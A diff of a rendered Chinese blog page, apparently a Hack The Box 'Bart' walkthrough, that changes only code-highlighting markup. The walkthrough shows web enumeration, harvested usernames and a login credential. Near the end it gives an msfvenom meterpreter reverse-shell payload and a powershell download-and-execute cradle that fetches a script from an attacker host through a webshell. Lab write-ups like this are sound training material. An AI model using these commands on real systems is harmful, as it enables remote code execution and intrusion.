@@ -348,13 +348,13 @@
             
               <div class="markdown-body">
                 
-                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -Pn -p- -T4 10.10.10.81</span><br></pre></td></tr></table></figure>
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -sC -Pn -p- -T4 10.10.10.81<br></code></pre></td></tr></table></figure>
 
 <p>偶尔就会像这样，我扫了全端口而Nmap只为我枚举出了80HTTP端口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.81</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Did not follow redirect to http://forum.bart.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 640.80 seconds</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.81<br>Host is up (0.38s latency).<br>Not shown: 65534 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Microsoft IIS httpd 10.0<br>|_http-title: Did not follow redirect to http://forum.bart.htb/<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-trane-info: Problem with XML parsing of /evox/about<br>|_http-server-header: Microsoft-IIS/10.0<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 640.80 seconds<br></code></pre></td></tr></table></figure>
 
 <p>但是我不想再扫一遍，那样又会花费很多时间，如果我边扫边对80端口进行访问，那么Nmap扫描端口又会占用大量带宽，致使我访问80端口也不会很流畅，而且我会因为访问80端口占用掉部分带宽，还可能会影响到Nmap发包收包过程中丢包而再次产生误报。所以我决定在我一筹莫展之际，再对目标进行端口探测。不过好在当下Nmap还是告诉了我一些我可用的 信息，例如标志性的Microsoft IIS httpd 10.0，目标是windows操作系统，服务组件为IIS httpd 10.0，它的域名是<strong>forum.bart.htb</strong>，它是一个子域名，它应该拥有应该父域名为bart.htb，我需要将其添加到&#x2F;etc&#x2F;hosts中，首先我尝试搜寻Microsoft IIS httpd 10.0已披露的漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit IIS 10</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> IIS <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220404233938790.png" srcset="/img/loading.gif" lazyload alt="image-20220404233938790"  />
 
@@ -376,12 +376,12 @@
 
 <p>就这样，我收集到了三个邮箱地址：</p>
 <ol>
-<li>To：mailto:<a href="mailto:&#115;&#x2e;&#x62;&#x72;&#x6f;&#119;&#110;&#x40;&#x62;&#97;&#x72;&#116;&#46;&#108;&#x6f;&#99;&#x61;&#108;">&#115;&#x2e;&#x62;&#x72;&#x6f;&#119;&#110;&#x40;&#x62;&#97;&#x72;&#116;&#46;&#108;&#x6f;&#99;&#x61;&#108;</a> </li>
-<li>To：mailto:<a href="mailto:&#x64;&#46;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#x73;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#x74;&#98;">&#x64;&#46;&#x73;&#x69;&#x6d;&#x6d;&#111;&#110;&#x73;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#x74;&#98;</a> </li>
-<li>To：mailto:<a href="mailto:&#114;&#x2e;&#x68;&#x69;&#x6c;&#116;&#x6f;&#x6e;&#64;&#98;&#x61;&#114;&#x74;&#x2e;&#104;&#x74;&#x62;">&#114;&#x2e;&#x68;&#x69;&#x6c;&#116;&#x6f;&#x6e;&#64;&#98;&#x61;&#114;&#x74;&#x2e;&#104;&#x74;&#x62;</a></li>
+<li>To：mailto:<a href="mailto:&#x73;&#x2e;&#x62;&#114;&#111;&#119;&#x6e;&#64;&#98;&#97;&#x72;&#116;&#x2e;&#x6c;&#111;&#99;&#97;&#108;">&#x73;&#x2e;&#x62;&#114;&#111;&#119;&#x6e;&#64;&#98;&#97;&#x72;&#116;&#x2e;&#x6c;&#111;&#99;&#97;&#108;</a> </li>
+<li>To：mailto:<a href="mailto:&#x64;&#46;&#115;&#x69;&#x6d;&#x6d;&#111;&#x6e;&#x73;&#x40;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;">&#x64;&#46;&#115;&#x69;&#x6d;&#x6d;&#111;&#x6e;&#x73;&#x40;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;</a> </li>
+<li>To：mailto:<a href="mailto:&#x72;&#46;&#104;&#105;&#108;&#x74;&#x6f;&#110;&#64;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;">&#x72;&#46;&#104;&#105;&#108;&#x74;&#x6f;&#110;&#64;&#98;&#x61;&#x72;&#x74;&#46;&#x68;&#x74;&#x62;</a></li>
 </ol>
 <p>但是我也不知道为何brown的邮箱后缀为local，请原谅我的见识目前还不够，我觉得它像是公司内部自定义的邮箱账号，而它们的邮箱前缀更像是一个用户名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brown  simmons  hilton</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">brown  simmons  hilton</span><br></code></pre></td></tr></table></figure>
 
 <p>紧接着我下拉滚动条又发现了一个员工，它又为我提供了一个潜藏的用户名Jane Doe，但是目标并未该员工提供任何我能点击触发的按钮，但是通过对该员工的信息介绍，我知道她是目标的开发部门，或许她会掌管有目标内部环境的配置信息，源代码，项目实施计划方案等等等等，她的账户通常会拥有Web站点更多的权限，她也就成为了我优先选择的目标：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405134858591.png" srcset="/img/loading.gif" lazyload alt="image-20220405134858591"  />
@@ -403,13 +403,13 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405142233935.png" srcset="/img/loading.gif" lazyload alt="image-20220405142233935"  />
 
 <p>好吧，我决定对目标子域名进行更深入的了解，我准备对其进行路径爆破，我指定了<strong>dirsearch</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://forum.bart.htb/ -e php</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span>forum.bart.htb/ -e php<br></code></pre></td></tr></table></figure>
 
 <p>哇哦，不可思议，它没有为我枚举到什么：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405143047126.png" srcset="/img/loading.gif" lazyload alt="image-20220405143047126"  />
 
 <p>我又尝试了gobuster：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://forum.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://forum.bart.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br></code></pre></td></tr></table></figure>
 
 <p>它一样的没有帮我枚举到什么信息：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405160711474.png" srcset="/img/loading.gif" lazyload alt="image-20220405160711474"  />
@@ -421,7 +421,7 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161105961.png" srcset="/img/loading.gif" lazyload alt="image-20220405161105961"  />
 
 <p>我尝试用wafw00f帮我枚举检测，可它也并没有检测到任何信息：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f http://forum.bart.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wafw00f http://forum.bart.htb<br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405161505798.png" srcset="/img/loading.gif" lazyload alt="image-20220405161505798"  />
 
@@ -446,19 +446,19 @@
 
 <p>我尝试对以IP为参数对其进行目录爆破,同样的，它也为我返回了200OK状态码的图片页面。至此我认为，WEB站点下边确实会存在某些目录，只是我通过扫描器提交了不存在的目录名被某种防护机制重定向到了该状态码为200OK的图片页面。因为它主域名bart.htb或是10.10.10.81返回给我的是200图片页面，而它的子域名forum.bart.htb返回给我的是一个500状态码包含服务器错误信息的页面。</p>
 <p>所以我猜测，目标的web结构是以10.10.10.81，也就是bart.htb为根目录，当访问根目录下不存在的目录会跳转到200OK图片页面，而forum.bart.htb是它根目录下的某个目录，只是通过IIS服务将其解析到了子域名的默认根目录。那么我访问到的子域名forum.bart.htb，它的完整路径应该类似于：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bart.htb/forum</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://bart.htb/forum<br></code></pre></td></tr></table></figure>
 
 <p>或是：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.81/forum</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.10.81/forum<br></code></pre></td></tr></table></figure>
 
 <p>当然它也可能是forum.bart，forum.bart.htb，完全无所谓，我可以都试试，为了不影响我的结论，我需要把&#x2F;etc&#x2F;hosts中的信息更改一下，因为我先前填的是：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.81 forum.bart.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.81 forum.bart.htb<br></code></pre></td></tr></table></figure>
 
 <p>在bart.htb无法访问时我尝试去将其更改过，但是bart.htb依然无法正常访问，我始终在纠结bart.htb究竟存不存在。现在如果根据我刚刚的想法，它确实应该是存在的，我就需要将更改为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.81 bart.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.81 bart.htb<br></code></pre></td></tr></table></figure>
 
 <p>那么我验证自己的想法会很简单，我只需要尝试去访问如下目录，当然它也可能是其他的目录，但是我觉得这种情况应该很少或是不会出现，因为如果一个企业这么做了，那么如果它对应的岗位负责人更换了，新人面对这样的处境将会很麻烦从而出现工作交接困难的情况，企业是不会允许这种情况的，虽然它只是个靶场，但我觉得应该也会符合情理：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://bart.htb/forum</span><br><span class="line">http://bart.htb/forum.bart</span><br><span class="line">http://bart.htb/forum.bart.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://bart.htb/forum<br>http://bart.htb/forum.bart<br>http://bart.htb/forum.bart.htb<br></code></pre></td></tr></table></figure>
 
 <p>我非常幸运，只尝试了第一个地址，它就成功的返回了我子域名forum.bart.htb的页面：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405173845895.png" srcset="/img/loading.gif" lazyload alt="image-20220405173845895"  />
@@ -471,12 +471,12 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405194403635.png" srcset="/img/loading.gif" lazyload alt="image-20220405194403635"  />
 
 <p>幸运的是我发现了另一款工具，Kalinux自带wfuzz，-hh参数是表示过滤掉返回信息中包含指定内容的消息，例如该环境中，如果我不使用-hh参数的话，它会返回一堆不存在的目录状态码为200：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bart.htb/FUZZ</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -c -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster<span class="hljs-regexp">/directory-list-2.3-medium.txt http:/</span><span class="hljs-regexp">/bart.htb/</span>FUZZ<br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405210655782.png" srcset="/img/loading.gif" lazyload alt="image-20220405210655782"  />
 
 <p>当然它们还是指向的那个错误图片页面，如果我想过滤掉返回信息为那个错误图片的页面，又不想因为200状态码过滤掉其他我不希望的文件或目录，我就可以选择如上图的630或是5628或是150693用-hh参数添加为我希望过滤掉的条件，它就会为我过滤掉符合条件的信息目录，然后把其他的条件为我显示打印出来：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 150693 http://bart.htb/FUZZ </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 150693 http://bart.htb/FUZZ <br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405211149549.png" srcset="/img/loading.gif" lazyload alt="image-20220405211149549"  />
 
@@ -490,7 +490,7 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405214725656.png" srcset="/img/loading.gif" lazyload alt="image-20220405214725656"  />
 
 <p>好吧，它什么也没有，于是我觉得去搜寻一下PHP Server Monitor v3.2.1，当你我希望知道某个组件的具体信息，最有用最直接最省力的便是去它的官方看帮助文档，该环境很贴心的为我准备了它官网的超链接，但我点进去发现一个有意思的事情，它的版本号为3.2.1，而我在它官网文档查看时，对了，这是它的官网链接：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.phpservermonitor.org/</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.phpservermonitor<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure>
 
 <p>我一度以为是我还处于内网环境中，但我觉得不对劲，我用我没走VPN的宿主机访问了一次，该组件只发布到了3.2.0，最重要的是我的目标机器发布到HTB好久了：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405215211649.png" srcset="/img/loading.gif" lazyload alt="image-20220405215211649"  />
@@ -521,7 +521,7 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405223757401.png" srcset="/img/loading.gif" lazyload alt="image-20220405223757401"  />
 
 <p>我拿到了一组可用来登录的用户名,我成功登录了进去：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">harvey:potter</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">harvey:</span>potter<br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224322773.png" srcset="/img/loading.gif" lazyload alt="image-20220405224322773"  />
 
@@ -529,7 +529,7 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405224835686.png" srcset="/img/loading.gif" lazyload alt="image-20220405224835686"  />
 
 <p>我又获取到了一个新域名，在目标80端口上。于是我又不得不更改&#x2F;etc&#x2F;hosts，将以下域名记录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">internal-01.bart.htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">internal</span><span class="hljs-number">-01.</span>bart.htb<br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220405225429409.png" srcset="/img/loading.gif" lazyload alt="image-20220405225429409"  />
 
@@ -554,7 +554,7 @@
 
 <p>我枚举到了一个register_form.php，它看起来像是一个注册页面，但是我无法访问它，一样的，我尝试根据刚才的发现访问register.php，它也是一直在加载中：</p>
 <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406001152492.png" srcset="/img/loading.gif" lazyload alt="image-20220406001152492"  />Dirsearch倒是提醒了我，我在以Get方式发送请求爆破路径，或许我可以试试用Post。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -m post -u http://internal-01.bart.htb/simple_chat/</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -m post -u http:<span class="hljs-regexp">//i</span>nternal-<span class="hljs-number">01</span>.bart.htb<span class="hljs-regexp">/simple_chat/</span><br></code></pre></td></tr></table></figure>
 
 <p>可惜结果是一样的：</p>
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406000818333.png" srcset="/img/loading.gif" lazyload alt="image-20220406000818333"  />
@@ -663,13 +663,13 @@
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406125904078.png" srcset="/img/loading.gif" lazyload alt="image-20220406125904078"  />
 
 <p>我可以本地Metasploit生成powershell载荷：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=1121 -f psh-reflection &gt;/home/worldisend/x.ps1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=1121 -f psh-reflection &gt;/home/worldisend/x.ps1<br></code></pre></td></tr></table></figure>
 
 <p>然后启动一个http服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure>
 
 <p>Matesploit启动对应的监听模块，然后将以下命令复制到webshell页面进行cmd参数提交，当然我试过直接将以下命令写入到payload数据包中的浏览器头字段中的<?php system()?>中，但它因为某种不知名原因失败了，所以还是老老实实一步一步走吧，别老是想着走捷径：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.5:80/x.ps1&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -nop -w hidden -c <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.10.16.5:80/x.ps1&#x27;))&quot;</span><br></code></pre></td></tr></table></figure>
 
 <img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220406132952924.png" srcset="/img/loading.gif" lazyload alt="image-20220406132952924"  />
 
